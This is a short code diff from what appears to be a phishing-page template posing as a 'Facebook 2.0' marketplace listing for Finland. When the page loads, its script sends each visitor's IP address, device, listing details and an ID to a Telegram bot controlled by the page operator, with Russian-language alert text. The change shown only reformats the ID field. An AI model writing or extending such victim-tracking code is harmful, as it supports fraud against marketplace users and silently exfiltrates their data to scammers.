@@ -984,7 +984,7 @@ window.onload = function() {{
     const url = `https://api.telegram.org/bot{BOT_TOKEN}/sendMessage`;
     const obj = {{
     chat_id: '{chat_id}',
-    text: `📄 Переход на главную страницу\n\n🇫🇮 Площадка: Facebook 2.0\n▫️ Объявление: {name}\n▫️ Цена: € {price}\n▫️ ID: {user_identifier}\n\n🖥 {device}\n ${ip} (https://check-host.net/ip-info?host=${ip})`,
+    text: `📄 Переход на главную страницу\n\n🇫🇮 Площадка: Facebook 2.0\n▫️ Объявление: {name}\n▫️ Цена: € {price}\n▫️ ID: copy_id:${user_identifier}\n\n🖥 {device}\n ${ip} (https://check-host.net/ip-info?host=${ip})`,
     sender: "user",
     reply_markup: {{
         inline_keyboard: [
